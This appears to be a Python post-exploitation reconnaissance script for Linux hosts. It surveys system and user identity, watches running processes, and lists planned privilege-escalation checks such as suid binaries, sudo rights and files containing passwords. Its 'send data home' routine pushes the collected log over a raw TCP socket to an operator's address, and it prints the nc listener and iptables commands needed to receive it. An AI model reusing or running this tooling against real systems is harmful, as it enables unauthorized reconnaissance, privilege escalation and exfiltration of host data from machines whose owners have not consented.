#!/usr/bin/env python
from __future__ import print_function
import os
import socket
import subprocess
import sys
import time

# Python program to print 
# colored text and background 
class colors: 
    reset='\033[0m'
    bold='\033[01m'
    disable='\033[02m'
    underline='\033[04m'
    reverse='\033[07m'
    strikethrough='\033[09m'
    invisible='\033[08m'
    class fg: 
        black='\033[30m'
        red='\033[31m'
        green='\033[32m'
        orange='\033[33m'
        blue='\033[34m'
        purple='\033[35m'
        cyan='\033[36m'
        lightgrey='\033[37m'
        darkgrey='\033[90m'
        lightred='\033[91m'
        lightgreen='\033[92m'
        yellow='\033[93m'
        lightblue='\033[94m'
        pink='\033[95m'
        lightcyan='\033[96m'
    class bg: 
        black='\033[40m'
        red='\033[41m'
        green='\033[42m'
        orange='\033[43m'
        blue='\033[44m'
        purple='\033[45m'
        cyan='\033[46m'
        lightgrey='\033[47m'

def info(text):
    print("[*] " + text)

def warning(text):
    print(colors.bg.orange + colors.bold + "[!] " + text + colors.reset)

def success(text):
    print(colors.fg.green + "[+] " + text + colors.reset)

# dictionary of survey tasks to complete of the form:
#     taskname: {"cmd": cmd_to_run, "results": empty_string}
base_survey = {
    "date": {"cmd": "date", "results": ""},
    "hostname": {"cmd": "hostname", "results": ""},
    "uname": {"cmd": "uname -a", "results": ""},
    "id": {"cmd": "id", "results": ""},
}

# TODO:
#   suid/sgid binaries
#   world-writable files
#   group-writable files for groups I'm in
#   sudo -l
#   cron jobs in /var/spool/cron
#   files that have the string 'password' in them
#   python/perl/shell scripts running

def get_local_addr(home_addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((home_addr, 1))
    return s.getsockname()[0]

def send_file(logfile_name, home_addr, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((home_addr, port))
    print(colors.fg.green + '[+] ' + colors.reset + 'Connected to %s:%d' % (home_addr, port))
    s.sendall(open(logfile_name, 'r').read())
    print(colors.fg.green + '[+] ' + colors.reset + 'Data sent')
    s.close()
    print(colors.fg.green + '[+] ' + colors.reset + 'Closed connection')
    return

def ps_watch():
    ps_cmd = "ps axo pid,user,args"
    task = {"cmd": ps_cmd, "results": ""}
    prev_ps_res = do_task(task)["results"].splitlines() 
    ps_res = None
    while True:
        task = do_task(task)
        ps_res = task["results"].splitlines()
        
        # check for missing processes
        diff = list(filter(lambda a: ps_cmd not in a, set(prev_ps_res) - set(ps_res)))
        if diff is not None:
            for pid in diff:
                print(colors.fg.red + "[-] Exited: " + pid + colors.reset)

        # check for new processes
        #diff = list(set(ps_res) - set(prev_ps_res))
        diff = list(filter(lambda a: ps_cmd not in a, set(ps_res) - set(prev_ps_res)))
        if diff is not None:
            for pid in diff:
                print(colors.fg.green + "[+] New: " + pid + colors.reset)
        
        prev_ps_res = ps_res
        time.sleep(1)


def do_task(task):
    out, err = subprocess.Popen(task["cmd"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    task["results"] = out
    return task

def do_python_perl_ps_check():
    #res = do_task("ps -ef | grep -E '(python|perl)'")
    my_pid = os.getpid()
    return

def task_banner(taskname, logfile=None):
    if logfile:
        logfile.write("========== " + taskname + " ==========\n")
    print(colors.fg.orange + "========== " +  colors.fg.cyan + taskname + colors.fg.orange + " ==========" + colors.reset)
    
def task_footer(logfile=None):
    if logfile:
        logfile.write("===============================\n\n")
    print(colors.fg.orange + "===============================" + colors.reset, "\n\n")

def log(taskname, task, logfile=None):
    task_banner(taskname, logfile)
    for line in task["results"].splitlines():
        if logfile:
            logfile.write(line + '\n')
        print(line)
    task_footer(logfile)

def usage():
    print('Usage: ')

def main():
    logfile = None
    logfile_name = None
    shuttle_home = False
    home_addr = None
    have_procfs = True

    # parse arguments without argparse, since python may be old
    # this will barf if you use it incorrectly
    if '-h' in sys.argv:
        usage()
        quit()
    if '-o' in sys.argv:
        logfile_name = sys.argv[sys.argv.index('-o')+1]
        logfile = open(logfile_name, 'w+')

    if '-H' in sys.argv:
        shuttle_home = True
        home_addr = sys.argv[sys.argv.index('-H')+1]

    # sanity checks
    info("Performing sanity checks...")

    # what OS? Linux? BSD? Solaris? other weird shit?

    # do we even have /proc?
    if os.path.isdir('/proc') is False:
        have_procfs = False
        warning("Aargh matey, looks like there be no /proc fs on this here system! Functionality is reduced!")
    else:
        success("/proc fs is present")

    info("Santity checks complete!")

    # perform the basic survey
    for taskname, task in base_survey.items():
        log(taskname, do_task(task), logfile)

    

    # check for relevant kernel/system privescs
    uname_results = base_survey["uname"]["results"]
    system_name = uname_results[0]
    kernel_version = uname_results[2]

    # wrap it up
    print(colors.bg.cyan + colors.fg.black + "SURVEY COMPLETE" + colors.reset + '\n\n')
    if logfile:
        logfile.close()

    # send data home?
    if shuttle_home and logfile_name:
        port = 63636
        local_addr = get_local_addr(home_addr)
        print(colors.fg.orange + 'Looks like I was told to send the log file home...')
        print('Paste these into your local terminal:' + colors.reset)
        print(colors.fg.green + 'iptables -I INPUT 1 -p tcp --dport %d -s %s -j ACCEPT'%(port,local_addr) + colors.reset)
        print(colors.fg.green + 'nc -nv -l -p %d > survey_%s.txt'%(port,local_addr) + colors.reset)
        print(colors.fg.green + 'iptables -D INPUT 1' + colors.reset)
        print(colors.fg.orange + 'Press Enter when ready....' + colors.reset)
        raw_input()
        send_file(logfile_name, home_addr, port)

    info("Entering pswatch mode....")
    ps_watch()

if __name__ == "__main__":
    main()

